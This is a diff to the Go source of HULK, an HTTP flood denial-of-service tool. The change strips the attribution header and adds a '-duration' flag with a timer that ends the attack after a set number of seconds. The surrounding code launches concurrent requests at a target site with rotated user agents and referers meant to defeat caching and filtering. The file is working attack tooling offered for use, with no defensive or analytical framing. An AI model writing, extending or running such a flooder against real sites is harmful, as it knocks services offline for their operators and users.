@@ -1,12 +1,5 @@
 package main
 
-/*
- HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
- Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
- This go program licensed under GPLv3.
- Copyright Alexander I.Grafov <grafov@gmail.com>
-*/
-
 import (
 	"flag"
 	"fmt"
@@ -20,11 +13,11 @@ import (
 	"strings"
 	"sync/atomic"
 	"syscall"
+	"time"
 )
 
-const __version__  = "1.0.1"
+const __version__ = "1.0.1"
 
-// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
@@ -41,8 +34,6 @@ var (
 		"http://www.google.com/?q=",
 		"http://www.usatoday.com/search/results?q=",
 		"http://engadget.search.aol.com/search?q=",
-		//"http://www.google.ru/?hl=ru&q=",
-		//"http://yandex.ru/yandsearch?text=",
 	}
 	headersUseragents []string = []string{
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
@@ -75,11 +66,12 @@ func (i *arrayFlags) Set(value string) error {
 
 func main() {
 	var (
-		version bool
-		site    string
-		agents  string
-		data    string
-		headers arrayFlags
+		version   bool
+		site      string
+		agents    string
+		data      string
+		headers   arrayFlags
+		duration  int
 	)
 
 	flag.BoolVar(&version, "version", false, "print version and exit")
@@ -88,6 +80,7 @@ func main() {
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
+	flag.IntVar(&duration, "duration", 0, "Duration to run the attack in seconds. 0 means no duration limit.")
 	flag.Parse()
 
 	t := os.Getenv("HULKMAXPROCS")
@@ -129,27 +122,37 @@ func main() {
 			err, sent int32
 		)
 		fmt.Println("In use               |\tResp OK |\tGot err")
+		timer := time.After(time.Duration(duration) * time.Second)
 		for {
-			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
-				go httpcall(site, u.Host, data, headers, ss)
-			}
-			if sent%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-			}
-			switch <-ss {
-			case callExitOnErr:
-				atomic.AddInt32(&cur, -1)
-				err++
-			case callExitOnTooManyFiles:
-				atomic.AddInt32(&cur, -1)
-				maxproc--
-			case callGotOk:
-				sent++
-			case targetComplete:
-				sent++
-				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+			select {
+			case <-timer:
+				fmt.Println("\r\n-- Attack Time Expired --\n")
+				fmt.Println("Final Status:")
+				fmt.Printf("In use               |\tResp OK |\tGot err\n")
+				fmt.Printf("%6d of max %-6d |\t%7d |\t%6d\n", cur, maxproc, sent, err)
 				os.Exit(0)
+			default:
+				if atomic.LoadInt32(&cur) < int32(maxproc-1) {
+					go httpcall(site, u.Host, data, headers, ss)
+				}
+				if sent%10 == 0 {
+					fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				}
+				switch <-ss {
+				case callExitOnErr:
+					atomic.AddInt32(&cur, -1)
+					err++
+				case callExitOnTooManyFiles:
+					atomic.AddInt32(&cur, -1)
+					maxproc--
+				case callGotOk:
+					sent++
+				case targetComplete:
+					sent++
+					fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+					fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+					os.Exit(0)
+				}
 			}
 		}
 	}()
